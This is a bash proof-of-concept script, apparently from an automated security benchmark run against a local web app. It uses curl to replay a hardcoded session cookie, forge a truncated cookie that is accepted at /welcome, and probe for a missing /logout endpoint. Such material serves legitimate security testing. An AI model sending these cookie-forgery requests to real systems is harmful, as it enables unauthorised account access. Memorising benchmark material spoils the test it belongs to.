#!/bin/bash
# POC: Demonstrates session fixation vulnerability by showing session reuse indefinitely and lack of session rotation after authentication
# Target: ./repo
# Created: 2025-12-01T16:16:32.866Z
# Session: benchmark-XBEN-103-24-mincfo1r

# Session Fixation Vulnerability POC
# Demonstrates:
# 1. Session reuse - same session token works multiple times
# 2. Crafted session acceptance - truncated/invalid session grants access
# 3. No session invalidation (no logout endpoint)

TARGET_URL="${1:-http://127.0.0.1:8000}"
VALID_SESSION="989972b06976394fd0728b9e85aee7511b58737901d4f6d72c899e3099da4468"
CRAFTED_SESSION="74657374310000000000000000000000"

echo "========================================="
echo "Session Fixation Vulnerability POC"
echo "========================================="
echo ""

# Test 1: Session reuse - use same session multiple times
echo "[TEST 1] Session Reuse - Using same valid session multiple times"
echo "Session: $VALID_SESSION"
echo ""

for i in 1 2 3; do
    echo "  Attempt $i:"
    RESPONSE=$(curl -s -b "session=$VALID_SESSION" "$TARGET_URL/welcome")
    echo "    Response: $RESPONSE"
done

echo ""
echo "[RESULT] Session reused successfully - VULNERABLE"
echo ""

# Test 2: Crafted session (truncated/invalid format) still grants access
echo "[TEST 2] Crafted Session Acceptance - Truncated 16-byte session"
echo "Session: $CRAFTED_SESSION (16 bytes instead of expected 32+ bytes)"
echo ""

RESPONSE=$(curl -s -b "session=$CRAFTED_SESSION" "$TARGET_URL/welcome")
echo "  Response: $RESPONSE"

if [[ $RESPONSE == *"Welcome"* ]]; then
    echo "[RESULT] Crafted invalid session accepted - VULNERABLE"
else
    echo "[RESULT] Crafted session rejected - NOT VULNERABLE"
fi

echo ""

# Test 3: No logout endpoint exists
echo "[TEST 3] Logout Functionality Check"
echo "Testing if /logout endpoint exists..."
echo ""

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/logout")
echo "  HTTP Status for /logout: $HTTP_CODE"

if [ "$HTTP_CODE" == "404" ]; then
    echo "[RESULT] No logout endpoint - sessions cannot be invalidated - VULNERABLE"
else
    echo "[RESULT] Logout endpoint exists (status: $HTTP_CODE)"
fi

echo ""
echo "========================================="
echo "Summary: Session Fixation Vulnerability CONFIRMED"
echo "- Sessions can be reused indefinitely"
echo "- Invalid session format still grants access"
echo "- No logout/invalidation mechanism"
echo "========================================="